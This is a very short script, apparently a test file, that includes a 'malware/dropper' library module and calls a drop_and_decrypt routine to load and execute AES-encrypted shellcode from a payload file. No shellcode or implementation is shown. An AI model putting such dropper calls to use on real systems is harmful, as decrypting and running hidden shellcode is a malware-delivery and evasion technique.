# 🧪 Simple test for AES-decrypted shellcode execution
# Uses `drop_and_decrypt` from the malware/dropper.my stdlib

include "malware/dropper.my"

# Load AES-encrypted shellcode and execute
drop_and_decrypt("payloads/encrypted_sc.bin")
